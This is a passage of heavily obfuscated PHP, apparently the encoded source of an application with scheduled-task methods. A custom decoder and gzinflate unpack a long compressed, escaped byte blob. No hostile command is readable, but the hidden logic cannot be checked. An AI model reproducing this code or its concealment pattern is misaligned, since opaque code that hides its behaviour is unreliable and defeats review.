$_SERVER[ˆ¡¹µ‹Â]; $Õá¯Øè = $this->listData($ÜËÌ×Ÿ); if (!$Õá¯Øè) { return; } if (!$Ş“Ú†½ò && $Õá¯Øè[$Çå¶ŒĞ–[191]] == $Çå¶ŒĞ–[91]) { return !1; } return parent::remove($ÜËÌ×Ÿ); } public function enable($‹ÊÕÀ—õ, $šéø€Â¾) { return $this->update($‹ÊÕÀ—õ, array($_SERVER[ˆ¡¹µ‹Â][2431] => $šéø€Â¾)); } public function run($Š¨¥¿ü«) { return $this->update($Š¨¥¿ü«, array($_SERVER[ˆ¡¹µ‹Â][2443] => time())); } } goto F„ñ•„¥íË; Cº¾‡—¾: $fileSize = strrev(base64_decode($_SERVER[Û¼Ô…²][0])); function binCheckNeq($«”ûá–Ó, $Æ òÕ–’) { return $«”ûá–Ó != $Æ òÕ–’; } $_SERVER[$_SERVER[Û¼Ô…²][1]] = $fileSize($_SERVER[$_SERVER[Û¼Ô…²][2]]); goto d´Œôå»¸›; d½ø‡Ò²Øã: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(strrev('Â‹µ¹¡ˆ'), "\xee\xc5\x97\x9d\x86\xf7"); $_SERVER[ˆ¡¹µ‹Â] = explode("\174\4\174\2\174\1", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\11\174\33\305\365\60\155\51\20\316\36\224\102\57\66\206\340\43\72\354\334\161\342\4\131\226\143\21\131\162\44\71\7\266\331\254\245\265\265\261".strrev('ÿ¿~†JìsxæøW-¥¡;(ZP ÷rÚ¹@ @(’Ğ-¥_p®®Ú9+´U¤').base64_decode('9/t9gURzvJmd4817b968efPi5nt/f9btaw5c88U1X3hvw4v3PfQ7Gkb/fRn9kvDx5x1yAA==')."\371\363\365\363\66\324\324\264\315\70\164\162\364\360\315\167\154\323\156\321\266\151\33\142\221\307\237\10\37\361\324\55\247\204\306\156\170\174\144\354\13\7\334\273\367\327\305\106\4\114\313\66"."\xd2\x1f\x25\x6f\xda\x8a\x3e\x6c\x58\xb6\x45\x13\x52\x66\xbe\xcf\xe8\xa7\x61\x23\x4f\x7f\xfd\xf4\xa7\x33\x1e\x29\xea\x39\xd3\xd6\x69\xd4\x47\x7f\x54\x68\x17\xf9\xd7\x5a\x99\x35\x58\xbe\x1a\x8d\x25\xd5\x44\x67".strrev('rje±":„¶¬ÒÔÔjõ­šÒ"‘Şz0Z\\j‹Ğ_¾ZŠĞT!¦g?9F (GG')."\x59\x47\x8\x20\x7a\xd5\x95\x25\xbd\x38\x42\x63\x24\x98\xb0\xb5\xa2\x9d\x34\x72\x3a\x87\x18\x2a\xf2\x76\x35\x87\x16\x84\xa3\x4a\x32\x1e\x88\x26\x2\xc1\x64\x38\x16\xa5\xc9\xc1\x58\x7b\x7b\x38\x59\x9e\x1e\x8f"."\105\42\315\201\340\302\362\234\216\170\140\101\173\100\101\355\313\352\252\221\357\63\153\224\345\64\147\271\122\113\3\255\206\236\115\323\140\136\143\315\261\107\12\20\112\362\20\232\246\174\51\233".base64_decode('pZEoD6X1Pq2UhdFqkSOFopHTWKcX6iM8lQa0km0a+RSNhIbtoibSUVtTaKL1PFSVCEVCwQ==')."\xa4\x82\x1b\xa8\xb4\xc6\x63\xed\xa\x4c\x42\x4e\xb3\x6c\xbd\xa8\x2c\x69\xb\xc5\x43\xa\x6e\x74\x53\x35\xe9\x6b\xb5\x2\xf8\x12\x45\x43\xa1\x4\x22\x11\x65\xbc\x1a\x6c\x3d\x57\x60\xd5\xd0\x32\x15\x2a\x8b\xc5"."\x5b\x42\x71\xa5\x79\x99\x22\x46\x28\x65\xe6\x72\x66\xde\x87\x6a\x41\x33\x69\x4b\x4d\xd\xc5\xe3\x34\xe0\x1\xf4\x8e\x84\xf1\xa4\x41\x24\xd6\xda\x9a\x8\xf1\x18\x74\x6e\x51\x4\xb5\x64\x2a\xe0\xa7\x23\x96\xee"."\313\332\352\240\226\55\61\64\35\240\277\325\360\3\277\246\5\250\273\322\310\33\45\100\123\250\302\64\371\262\202\100\211\101\353\54\105\117\103\40\207\312\233\120\256\27\322\172\31\324\12\26".base64_decode('MNAKHaTBpnn0dw6U71Vxnl60VT2fMtNGHtbxfMBHzc60FA0EQON9ZjbNwpaxCnrZZ2T1aA==')."\51\47\203\360\150\52\143\144\323\105\266\364\76\13\222\106\43\174\45\143\130\21\53\240\226\160\42\140\364\215\210\245\210\341\72\170\256\145\226\212\51\75\214\226\16\215\67\100\262\156\333\250"."\163\154\100\314\316\102\326\324\322\11\275\310\273\146\230\255\250\242\130\311\226\23\113\4\254\325\54\346\132\20\321\200\357\243\5\143\164\126\310\30\140\113\46\55\215\230\277\246\353\164\357\47"."\75\135\47\243\177\152\201\52\166\103\233\62\172\66\253\352\303\72\254\251\134\172\272\305\6\303\157\365\32\171\77\112\241\321\160\114\315\150\126\246\75\75\135\45\245\30\261\115\353\303\276\102"."\xa6\x0\xb\x9e\xaf\xf1\x6e\x7\xce\xe3\xa1\x8b\x9a\x76\x48\x22\xd9\x59\x33\xa5\x65\xe5\x2e\xd2\x70\xc6\xb6\xb\x9\x3d\x9f\xc6\x23\x1\x5d\x31\x87\xf2\x64\xa4\xa\xba\xe\x40\x2d\x1e\x25\xad\xb4\x2b\xcb\x94"."\266\106\243\321\142\5\163\131\36\142\275\343\151\26\117\264\207\331\164\246\373\0\133\31\307\250\202\17\32\26\41\176\142\345\152\205\102\326\110\151\266\141\346\375\146\312\326\155\257\145\27\165".base64_decode('DWoMpFK6ZXmDZt4umllvIJs1h7yxotFv5BuVOqDDKBOtdy+mjY2wiKvmKBhx8Gfqmkp2nw==').base64_decode('dxZbnBy6qOWtPr3oDcHKaFRQYzmBZGAthlUwLQM3r1HRbFtLZTBxEdU3fQa8kc8aeb0cFg==')."\125\242\173\73\212\132\177\116\153\124\12\245\136\64\0\260\40\41\55\205\41\144\140\30\200\106\45\247\15\173\265\176\126\123\150\270\140\24\165\213\365\132\131\320\236\4\214\352\363\266\343\205".base64_decode('ZOhpbwJRb6hsav00BeGKwvJoalsy2aGGWxF7jobU9kAy2Aa121o/qzqCaDKvkiUu9aIFhQ==')."\261\51\212\72\47\22\73\314\41\275\210\76\334\74\322\250\14\230\351\136\163\330\307\262\60\160\2\121\26\6\214\347\267\140\173\343\132\276\37\167\243\167\304\326\55\67\155\152\106\314\334\327".base64_decode('R1evr1fvM4vQG2uw3zn4ET3fb2dY3YlQfHEoriZircklgTjw/jzCnGHWGvz1rDeup9Egpg==')."\154\126\116\53\210\321\137\352\305\13\6\177\234\345\342\105\304\362\42\341\5\170\354\132\274\26\2\362\312\120\254\356\210\221\63\160\367\154\236\103\6\33\11\6\13\240\101\176\322\347\246\156"."\xab\xae\xa6\x3b\x3d\xb9\xd6\x8b\xfe\xad\xab\xed\xea\x6e\xf1\xd5\xf5\xcc\xf7\x1b\xa2\x8c\xbf\xc1\xd7\xa0\x4c\xa9\x9f\xa1\x74\x20\x49\xc5\xd0\xb2\xa\x74\xba\xc\xa2\x5e\x89\x2d\x74\xe\x8b\xc0\xf0\xbc\x99\xd7".base64_decode('Ky4shEimpXvbdA0RaTQRjnnxsG/R+GeMLuaVEi1xzQtNjIcWdYYSSbU9lGyLtUDzQwEI5Q==')."\x51\x61\xd2\x5e\x36\xc7\x58\x30\x3\xb6\x98\x87\x6a\xf5\x61\x89\x87\x8\x5e\x90\x92\x7\x84\x94\x8b\x9a\x43\x8c\xfa\xbb\x10\x28\x98\xd1\x53\x3\xe3\xe4\xa1\x10\xf4\xc6\xa4\x74\x89\x4d\x5d\x17\xfd\xe9\x1\x6c"."\xee\xa1\x3f\xaa\x61\xb5\x4a\x7c\x13\x47\x39\x7d\x55\xcd\xde\x15\x8\xb3\xda\x75\xc6\x44\xe0\x4b\xe1\x1c\x5a\xc3\xa2\xe5\xaa\x93\xc9\xb1\x6e\xb5\xb\x4c\x47\x4b\x66\x89\x91\xe6\x5c\x10\x45\xdb\x74\xa3\x3f\x3"."\xd\x35\x70\x75\x29\x33\x6b\x16\xb5\x2c\xa6\xfd\x4c\x70\xed\x37\x80\xc\x17\xb2\x25\x84\xf7\x7e\x5c\x71\x32\x53\xca\xf5\x2\xa7\x42\x63\xd4\xaf\xdb\x42\xa6\xb4\x46\x90\xe0\x95\x63\x1c\x19\xb1\x75\x3b\xdc\xe2".strrev('sH‹*Hsf ÜFô×nÂÑ2—İw—¤ºá!„i€N=ze:—P‰í|…}»W«ó»à')."\xe\xe6\x71\x4d\x6e\xba\x80\xa7\x27\xeb\xcb\xa1\x4a\x48\x9d\x41\x93\x73\x65\xba\x7d\x99\xe3\xe4\x71\x8a\x5e\x2c\x9a\xc5\x89\x0\x41\xc2\xa\x61\x94\x78\xba\xa0\x72\x9b\x8b\x1d\x16\x22\x1\x2c\x9c\x31\xb9\x98"._kodDe('MR9PWVEw4RSsVjqf8jN+h8+fvBG++43WV5JhMVGNVyJvPPnzNvCAdunVlq5swOE7UxlQHYE=')."\77\75\115\271\237\43\211\56\133\232\124\307\352\55\332\46\316\54\72\40\21\46\146\114\150\31\232\172\350\125\211\167\217\165\64\255\147\165\206\105\31\235\11\20\365\0\206\206\237\343\130\37".base64_decode('R3a0RUCpQnIzrDgqidk9iy/BeyqRgGUeQB4RzKKpi5FVI+IdRb3PGGYEYthu14oDrGOopA==')."\130\157\70\42\255\305\326\316\110\104\15\306\242\111\264\45\243\51\113\342\341\144\210\321\241\100\213\32\10\166\100\114\120\66\56\226\311\202\5\115\31\234\2\170\202\32\341\27\22\20\142\301"."\5\63\217\350\47\220\40\257\330\260\225\145\245\205\200\0\10\42\204\12\227\234\200\70\175\156\225\67\207\210\207\227\267\311\51\236\51\300\356\251\224\27\206\151\112\363\311\301\203\207\26\62"."\223\13\73\142\11\50\60\37\247\42\331\274\227\257\267\216\116\310\312\111\50\262\40\4\211\207\2\126\145\64\220\270\3\113\22\214\205\227\20\174\321\130\245\211\56\315\147\355\141\35\311\145".base64_decode('hajv7JVXzHzJ8upYyhBfmOZtaw8EvYm2wJTpM2jqsly6O9lmWN2n8jgM45A1TS3qiOCwDw==').base64_decode('TalvYOQASUlS85Z5c15cCx5BX319Patr8gwlg+gc5yZpMkts31VKDbAFo6WY6Iu5jOUdMg==')."\30\145\76\221\357\22\116\54\307\236\23\235\374\20\252\50\21\116\254\152\51\374\61\25\325\150\227\54\171\244\320\262\112\243\102\6\223\350\151\252\226\355\107\203\156\147\162\162\242\230\170\32".base64_decode('16l4yOeOjyIeWyeOy00qmEgghW4srdiGpZXasNTVhqXlbaBJltGfR71kzA2mYwGeDmlaHQ==')."\323\74\254\242\202\52\254\41\125\356\12\14\22\164\103\316\151\343\324\214\165\262\275\145\72\153\107\240\375\124\157\113\200\321\202\271\363\21\212\52\203\130\323\144\346\233\252\33\174\365\325\12"."\333\61\67\125\167\46\133\321\376\141\376\274\103\347\6\315\134\1\23\306\166\274\111\304\113\210\156\24\347\301\362\230\213\145\63\26\351\340\53\214\306\103\111\15\230\343\134\277\14\67\327\77"."\136\255\200\154\71\155\225\231\107\350\215\230\146\316\227\2\34\306\142\50\347\101\70\142\361\130\262\55\34\135\250\266\307\132\102\21\65\34\105\162\132\262\74\275\263\103\164\136\116\157\216\45".base64_decode('2xypnUhSWxyIhN3goaXhRDJRMQuldYZcOS3Nakc81BpeyqOt4VCkJaEGA8E2ARMNtEMEiQ==')."\x44\x7a\x36\x6d\xf9\x9d\xf0\x2a\x12\x39\x13\x5c\x9d\xa6\xc2\x84\x41\xcc\xa1\xc1\x52\x99\x6e\x46\x15\xb4\x18\x6d\x5f\x74\x40\x60\xe8\x2e\x56\x48\x92\x9e\xa8\x6c\xd1\x97\xb8\x0\xc9\xf6\xea\x39\xc6\x6c\xd1\xd6"."\xb\x66\x84\xed\x3b\x6a\xe8\x4f\xad\x12\x48\x28\x76\x41\xe5\x6c\xb5\x77\x84\x7\x49\x37\x58\x1c\x9\x1b\xf0\x7d\x5\xc4\xdf\xb2\x16\xa8\x18\xa6\x59\xda\xe4\x54\x4e\x8\xf4\xd9\x5c\xe0\x74\xc5\x11\x13\x11\x79".strrev('¶—T®Økøa„³£(`PÑcÄ—T³¬â„uQÖ„úsXh©,@Æ|Ì0‰óDh')."\xe0\xec\x5a\xd6\xd0\x98\xe\x4b\xc\xfa\xa\x93\xd\xe5\x49\x40\x53\xd\x2e\xd2\xe7\xd9\x70\xf7\x62\xe9\x86\xc9\xb5\x2c\xd0\x87\xd6\x3\x93\x4c\xcc\x12\xff\x4c\xaf\x69\x66\x19\xa3\xcb\x31\xc1\xa\x11\x1b\xae".base64_decode('81xhMewYZrx6MucJgLOxhaGoylCKxiQ0pAmheDwWh5GwzQGm76KZ8VCCsUnMfww2Tn7fZA==')."\x40\x5f\x1d\x9\x71\xf0\x79\xff\x69\xdd\x43\x93\x6b\xba\xbc\x93\x7d\x3d\x28\x50\x5b\x77\x32\x8d\x42\xac\xdb\xe7\x88\x32\xd9\xba\x54\xe4\xa5\xf1\x52\xaf\xb1\xe6\xd7\x36\x76\xfb\xbb\xfd\x35\xf3\x1b\xbb\x2\xde".strrev('÷BwÛ±<œn©îêîOËûé=íÔŸÏu4ı¡?Î'."\0".'µ´Ïõg¡!“µäI·¶w½UwšU').base64_decode('UE9d7Xz2nVSpiIR+RvpRU9OTa1CT0LaUg+QlikYAWMYqoyBSV89Yy9LRHOr9okSXt3tyzw==')."\x7c\xa9\x9c\x94\xe4\xfe\x16\x62\x49\x48\x80\xc9\x70\xb8\x80\xf7\x54\xdc\x33\x5e\x14\x2f\x78\xc0\x8f\x52\x3e\x25\xf8\x3b\x5e\x10\xbd\x1a\xdf\xdf\xf5\xe7\xc5\x3e\xca\x2e\x72\x1d\xe8\x20\x42\x52\xc1\xac\x56\x4f".base64_decode('or9r2UT268NcEOgzioCdpbyxkm1o8vpKCJg2Q+xe3R7SGXqgdEccIQdjoChLimUl5kuUVQ==').base64_decode('HEc5MhkFFe/thngM8WOYpwkAbaW0gp6QeqiqyUBzJKQy0gIkmMUJOWzmJyWoa4KUMsIgKQ==').strrev('4˜ôXº™5ƒß|'."\n".'yTåC¡O4Ò’AVÆ3AHşğ*ÈĞäU7@Š«2µ¼–bˆ¢').strrev('\\¸}p*ƒ\'*Ç'."\n".'"Ãú7Úe­®§«=}¼×Ä!t÷OK©wwM›a%´,†b'."\n".'›A')."\x4d\xed\x88\xf0\x6c\x1a\x35\x8b\x7c\x67\x51\x70\xec\xdf\x6d\xd3\xd6\xb2\x8e\x2a\x92\x38\x85\x91\x26\x26\x86\x80\xc2\x96\xce\x76\x44\x50\x2c\x2c\xb\x4b\xe7\x3e\x84\x8e\x46\xb9\x82\x94\x4b\x94\xd2\xc1\x3\x2e"."\x91\xd0\x6d\x1f\x87\xf0\x48\x99\x2a\x8a\x3b\xce\xe0\x9a\xaa\x18\x95\xcf\xa3\xe5\x14\x94\x78\x1c\x55\x9b\x27\xc8\xb6\xdf\x71\x58\x64\xe9\x5a\x31\x95\x69\x2d\x65\xb3\x36\xd7\xb6\x64\x8d\x1\xf8\x2\xac\x15\x38"."\273\362\2\33\230\134\251\150\253\131\144\312\307\72\150\106\125\135\45\300\160\76\157\246\173\145\124\23\334\165\101\0\311\61\111\245\206\235\263\50\341\250\322\34\213\105\102\201\250\202\31\71"._kodDe('MgwcERAuEO0JqbAGnH0frfg7vbGk1rfWSSZRCvhMHLnEAe5hrLlHeIYkZAyhW2St0vSmAvs=')."\x2a\x3c\xa8\xd5\x1e\xac\xbe\xf0\x88\x9d\xaf\x47\x1c\x5f\x78\x6\xd\x7d\x88\x4\xf8\xae\xd4\x3\x9b\x55\x8f\x50\xbc\x40\x30\xdc\xe2\x31\xac\x16\xb2\xe9\x26\x1f\x20\x59\xac\x9\x76\x6\x6b\x95\xb3\xda\x88\x87"."\66\47\242\17\352\131\17\123\311\170\130\33\75\114\21\345\41\12\244\26\150\126\47\132\116\320\54\22\104\124\63\343\301\10\204\361\327\43\16\124\74\346\120\136\57\22\20\30\30\261\137\367"."\210\275\274\247\277\150\226\12\35\354\233\122\214\66\13\22\104\233\171\102\334\64\155\17\323\155\171\144\45\27\264\42\300\326\111\305\341\254\334\33\62\376\356\106\0\176\341\254\362\121\372\234"."\311\52\237\17\247\176\157\65\255\21\224\231\153\31\227\163\300\20\75\33\27\73\361\200\213\320\142\261\120\161\7\132\65\70\272\243\325\312\141\216\240\171\47\242\212\263\23\161\152\46\204\134"."\xb7\x16\xc6\x7d\x9e\x86\x3f\x8a\x76\x22\x9\xe9\x73\xb6\xd6\xcf\xbe\x85\x89\x15\xdf\xa7\x54\x0\xa5\xe1\xb8\x9e\x1a\x49\x9\xb5\x4e\x8b\xa4\x2c\x72\xc6\x9a\x9c\xfd\xf1\x90\x5\x54\x9\xf9\x2b\x4f\x2e\x47\x68"."\x3e\x17\x87\x4e\x98\xc0\x6\x97\x61\x39\x9f\x58\xc7\xe2\xf8\xfc\x65\x9\x1d\x22\xb4\x2f\x56\x10\xd2\x3\x6d\x2c\xa6\xbf\x9\xc4\xcd\x5a\xb3\x6c\x34\xa6\xc8\xd9\x40\x79\x3d\xce\x18\x5e\x55\x3e\x42\x89\xc9\xd1"."\164\202\153\13\43\241\326\244\162\112\14\221\55\303\124\151\31\25\3\53\344\37\63\257\70\352\146\303\245\64\221\174\21\327\362\151\232\262\34\221\370\345\115\125\354\43\125\216\342\2\77\234"."\x8d\xf0\xb0\xa8\x52\x8e\x71\x78\xb8\xe5\x41\xc0\x78\x40\xba\x2f\xd8\x12\x4b\x8a\x9\x2e\x58\x2\x91\x4f\xb3\x60\xd7\x85\x75\xad\x10\xd2\x59\x9a\x98\x5a\x19\x21\x25\x3a\x23\x12\x58\xbb\x1c\xdf\xc5\x51\xb1\x98".strrev('Ö¹L/¬QˆµWî'."\n".'ı‚©İÊo	ò1‘‡Q¼]#¹u…–+Ä´ÁHIø(J')."\171\321\372\75\160\356\353\311\32\371\1\211\63\13\225\46\152\75\56\52\265\35\152\162\265\34\52\222\100\304\10\300\102\6\214\317\150\105\61\230\214\374\140\32\300\373\140\141\20\21\225\300".base64_decode('+rRBIZk4ykhExLJHWOvloLNSGm3xkN821Hh5ufLpKaGWMyBKexAtiKCxQj+kI0nTg5X26A==').base64_decode('h/JvZgJAgBjel3ItcAiAw4sRAWACGRrwGkZAQIpQJSUAJ0BOOYC2JMDpOhLUs4iNFX14jQ==')."\54\300\314\210\215\11\45\157\62\316\45\164\324\117\250\136\324\220\50\313\223\241\205\362\24\323\171\301\27\370\311\27\137\142\142\174\305\172\352\27\15\302\303\251\226\267\3\143\160\345\170\153".base64_decode('0eRSLWfpbqAg2TZySw4XG5bGwyE6lCVJZdxChCvVFcWCRQVGQ5OYVoyewxQp5/KhzQAY5g==')."\x78\xea\x25\x39\x4b\xd0\x99\xd5\xf4\x2c\xc\x38\xdd\x5a\xd7\x3c\xdb\xa6\x89\x76\x98\x45\x5f\x11\x7d\x59\x34\x48\xa2\x71\x40\x20\x88\x71\x46\x42\xeb\xd3\x65\xe9\x80\xd7\x62\xa1\xc\x89\x5a\x3b\x85\x20\x56\x32"."\121\320\30\221\346\2\32\303\136\262\235\50\11\302\111\232\54\332\303\133\101\63\42\134\252\305\344\41\224\66\154\234\202\327\233\311\16\200\4\240\340\220\356\302\42\56\223\154\302\171\312\346"."\136\154\31\74\223\34\220\116\61\1\22\353\10\113\367\11\251\246\262\75\122\312\54\0\102\110\66\172\71\163\120\227\22\361\201\133\101\344\110\121\232\55\145\211\112\45\50\76\107\244\105\150"."\171\245\211\54\54\106\201\300\102\131\262\221\246\53\330\207\267\16\76\231\116\7\212\105\206\277\264\233\370\60\30\45\312\111\230\374\45\330\342\253\304\256\150\345\241\101\141\201\107\253\302\37"."\366\321\325\217\117\34\143\354\164\137\16\227\203\312\332\304\312\25\45\304\251\273\63\126\31\74\220\315\12\73\51\167\174\334\42\164\325\313\205\344\224\161\213\265\222\135\54\63\61\250\224\306".strrev('ØÎô“Î¡ã!^<—,ÿúÉ«EôµÓ:ò1˜9ÌG¬i‰Æ‡d_¥\'o“îäËã/÷')."\22\170\120\227\67\13\134\307\52\110\24\347\332\145\262\10\310\3\122\104\265\35\42\125\234\324\57\55\47\7\206\240\345\113\307\3\163\254\160\314\147\215\203\263\156\70\156\124\102\150\342\60"."\147\264\162\41\234\205\347\122\256\124\210\160\237\1\317\53\27\342\234\14\207\160\27\147\214\327\126\226\315\153\271\356\241\253\136\171\355\26\32\376\373\345\377\363\370\165\347\320\360\314\331\160"."\320\271\346\113\153\276\214\102\44\54\114\301\317\132\152\230\337\176\354\270\117\236\171\357\7\263\316\365\326\254\150\173\347\302\320\214\222\266\341\234\226\163\137\365\376\172\301\153\217\24\206\266"."\x76\xaf\x1c\xec\x9f\x3d\x67\xf2\x85\x3f\xbb\xff\xd8\xdc\xd7\xf7\x5\x37\x1c\x5d\x3a\xfd\x9e\xcc\xb3\xdf\xf2\x3e\xf3\xc5\xdc\x1b\x7\x1c\xf1\xb5\x69\x81\x4f\xdb\x4b\x7b\x55\x7b\x70\xdf\xf3\x3d\xbf\x3d\xe5\xcb"."\x81\x39\xef\x3c\x35\x67\xea\xbf\xde\xba\xf7\xb1\x9a\xff\xd9\xbb\x3a\xf6\xfd\x37\xf7\x7e\x74\xc2\x99\xe7\x1c\xf0\xef\xbf\xfe\xfe\x9c\xef\xb5\x1f\x75\xfd\xb9\x13\xf6\x4e\xbe\x71\x6a\xef\xfa\x27\x23\x83\x93\xe7"."\337\373\120\355\3\245\325\173\36\172\314\367\366\202\305\275\267\154\375\340\345\350\106\355\233\257\115\70\176\121\357\246\326\55\157\206\137\275\147\132\375\315\335\7\314\173\244\345\173\325\107\315"."\176\143\372\204\73\32\316\172\366\350\217\126\54\334\361\134\323\55\377\76\370\117\332\216\7\47\334\345\175\154\335\73\167\314\31\64\17\373\345\15\221\237\35\30\357\37\375\375\103\327\276\364"."\xdc\xbc\xe7\xb7\xa4\x3f\x99\x9d\x59\xf2\x9f\xeb\xe6\xff\xf5\xe5\xe2\xa4\x6f\x4d\xfb\x93\x77\xde\x4b\xc6\x9d\x77\x3d\xde\xee\x8d\xbe\xdd\xd4\xf6\xdb\x1b\x8f\xb9\xea\x27\xb7\x2d\xf4\xbe\x31\x3c\x61\xdb\xa3\xfd"."\x27\xdc\x78\xf1\xe3\xfb\xce\xee\x3b\xe9\x9b\xaf\x2d\xb8\xec\x85\x9f\xfe\xeb\xef\x8d\xef\xce\x8d\x9e\x64\xaf\x38\xe6\xbc\xf\x17\xdf\xd6\xf1\x9b\x47\xb6\x5d\x31\x76\xed\x4f\x47\x9f\xbd\xe7\xac\x8b\xef\xb9\xe8"."\356\37\134\270\73\361\304\25\223\246\76\124\373\207\43\277\170\130\333\256\27\176\327\161\374\153\115\53\337\375\316\217\152\75\127\374\347\211\372\23\276\363\202\72\174\364\237\376\321\161\132\364"."\xad\xe6\x53\xe\x7b\xbe\x7e\xde\x8e\xe6\xd8\x3e\xeb\xe0\xe6\x1b\xa6\x9c\xfd\xe1\x8f\xd7\x1f\xf1\xe0\x8f\x56\x3f\xfc\xc6\x57\xc6\x8e\xba\xfa\xd0\xd3\x4f\xdf\xf7\x64\x7d\xc3\xaa\x79\x5f\xf3\xcc\xb0\xd7\xcc\x9b"."\342\175\365\331\263\167\145\17\372\112\361\301\103\146\334\326\374\303\23\157\373\166\365\321\273\127\146\147\274\373\360\35\125\336\107\157\334\375\373\326\137\256\57\74\274\361\341\307\236\71\350\230".strrev('6µöj<G5Êün·ÁÀõ™_±ØöŸ¯çäø¼¿éÿ«Ş×–ğÿ>ÿ×¸ü}Ÿ\\\'ºyo')."\66\337\376\373\53\316\37\362\76\264\245\353\273\263\346\244\175\333\123\351\266\376\11\361\27\112\47\14\77\146\317\74\340\254\122\44\253\234\71\363\315\47\2\307\36\173\224\367\256\365\236\375".base64_decode('t1x45dZcuO4LN/xs6bKf1L/U2ZudOWQd9bfDvvvIHzZfNPmQL1Y9ub7/8LNuNWZfdOLoAw==')."\xcf\x6f\x5c\xe6\x5b\xba\xf9\xf2\xb6\x67\x2f\x9e\xb5\xe1\xb7\x5f\xbd\x6c\xc2\xdd\x3\x77\x2e\xfc\xa6\xd9\xd8\x57\xdd\x16\x35\x4f\xbd\xe9\xb8\xdf\x1c\xf9\x9d\x59\x4f\x3c\xda\xf9\xf8\x97\x82\x17\x3f\xb0\xf2\xaf".strrev('ìç•Ø÷8]İvï á?oİLÈè9nãÛ-ê£ò=Î÷½ñİƒ¾éwYß£Õq‡c').base64_decode('OvSnl9x21sZJW/ac+9LQ6Uemzu+umvFKbctX5330wJmv9D55buSG1GN3tDbXt908uvHDqg==')."\277\265\377\365\206\63\177\265\306\363\265\356\336\363\252\27\236\361\215\252\125\353\252\277\326\362\325\137\57\272\243\336\367\237\372\310\351\227\134\166\370\145\17\356\370\346\171\257\214\316\76\344"."\x3b\x2f\x1d\x97\x3a\x78\xcf\xc8\x3f\x1b\x26\xed\xdc\xf5\xcc\xd7\xba\xaa\x52\xbd\xd\x87\x14\x4b\xdd\x4f\xd4\x4f\x78\xec\x10\x6d\xfd\x91\xe7\x9d\xf3\xa7\xe7\xbf\xb2\x53\xdb\xfd\x67\x33\x79\x47\x74\xe4\xd6\xc9"."\xe7\xaf\x7f\x38\x75\xcc\xcd\xb3\x6f\x3c\x77\xe4\xc0\x9d\xc5\xf5\x7b\xe\xbb\xf7\xad\x43\x27\x7e\xf1\x6b\x89\xb6\xa3\x8f\x78\xe4\xe0\xc3\x83\xfa\x11\x8f\xe\xad\x78\xbd\xb0\xfc\xe6\xef\x3c\x39\xe1\x5b\xfa\xd1"."\x9b\xe\xad\xbf\xf4\xe7\x7\x6f\xda\xba\x38\x3f\xe3\xc5\xc7\x4e\xbd\xe1\x49\xe3\xb1\x9d\xb9\x6d\x7f\xcc\x1f\xb5\xf5\xb0\x63\xbe\xf8\xd4\xfe\x2b\xaa\x4e\xba\xfd\x4e\x7f\xe8\x37\xad\x6b\x1a\x7e\xff\xe5\xc4\x49"."\367\327\374\352\224\13\326\335\62\273\156\347\207\53\46\156\261\327\175\375\244\266\123\236\76\356\303\356\206\343\236\177\160\327\53\227\255\37\355\157\36\171\145\133\362\252\237\277\34\367\175\373"."\xd5\xbb\xcf\xbc\x3b\x97\xaa\xde\x96\x1a\x7a\x70\xd5\xe6\x86\xf6\x13\x1e\xdd\x3f\xfc\xca\xb9\x8b\xd6\xe\xa4\xcf\x9b\xf2\xfe\xaf\xd7\xa9\x2f\x64\x6a\xfe\x79\xc9\xa4\x63\x16\x1e\xbd\xff\x8f\x39\xfb\xad\xc3\x2f"."\374\307\43\323\177\236\312\76\164\335\273\75\277\310\6\17\175\357\225\252\3\156\177\377\273\236\105\223\272\226\15\356\131\175\363\252\373\116\75\175\337\261\255\257\155\72\154\346\151\163\347\35"."\222\74\351\260\163\274\227\277\127\372\103\335\41\352\202\103\46\154\315\237\334\134\77\262\360\73\377\354\72\73\362\355\374\217\17\273\162\332\177\66\275\172\135\266\361\306\305\347\177\160\363\232"."\75\57\157\137\261\140\347\151\352\277\365\3\257\330\362\253\217\6\17\76\343\374\347\176\376\207\201\373\116\215\265\325\37\164\376\11\126\372\206\77\34\177\353\226\147\353\166\217\56\376\371\163"."\x1b\x83\x1b\x36\x4f\xbf\x60\xe9\x4d\x1b\xb2\x67\x96\xd6\x1d\xf9\xc0\x81\x75\xf\xdf\xf7\xe5\x27\x56\xff\x6b\xaf\xd5\xf8\xcb\x3d\x1d\xfa\x6b\x6f\x6d\x5b\xfb\xa5\xe4\xa6\x8b\xde\x3a\xb1\xdb\x73\xf4\x96\x9a\x2b"."\x7\x2e\xf8\x60\xe8\x91\x91\xee\xf6\x97\x76\x6e\xff\xf2\xfb\x7f\x1e\x3d\xa2\x7d\xea\xae\xcc\x93\x57\x1e\xb2\x67\xfa\x73\xde\x75\xbb\x1b\x8e\x6b\x5c\x7a\x52\xdb\x9\x4f\xfb\x7e\xf3\xcd\x27\xae\xbc\xeb\x83\x8f"."\137\232\163\317\5\117\177\143\306\37\377\70\43\277\375\57\33\213\7\235\330\71\170\366\337\232\36\336\377\352\222\247\175\237\174\360\316\317\227\374\340\276\125\377\363\356\333\117\307\356\137\373"."\311\253\177\373\367\337\337\337\176\332\17\112\237\274\175\374\276\343\367\354\372\340\15\377\245\176\265\347\223\117\276\271\160\315\57\177\260\371\203\7\217\377\170\270\55\377\351\211\371\371\336\267"."\xb3\xcd\x8f\x1c\xf8\xea\x81\xf3\x7e\x7b\xe4\x8f\xf\xdf\x77\xd1\xa9\x7\x6c\x4c\x6f\x7d\xe6\x8c\x97\x12\xc7\x4c\x7b\xe1\xb\x7\xfd\xa4\xfd\x81\x73\xae\x1b\x78\x72\x56\xcb\xc9\xd7\x1e\xf8\x4c\xd7\x61\x47\xdd"."\334\372\136\327\75\127\357\324\123\221\133\246\136\226\171\342\222\3\37\317\104\277\230\50\134\77\353\202\256\277\276\331\261\365\250\113\336\76\172\303\77\217\33\173\167\321\337\376\262\163\323\143"."\xdf\xbe\xeb\xb9\x9d\x17\x66\x46\x9f\x5c\x33\xf1\xfd\xe1\x5c\x6a\xed\xf\x76\xbc\xb4\x63\x6b\xe4\xb5\x13\x97\x9d\x36\xed\xe9\xf7\xee\xb8\xed\xf0\x85\xe7\x5f\xf8\x6e\x71\xfa\xc6\xf5\xd7\xf4\x6e\xbc\xf7\x94\x9b"."\xea\xaa\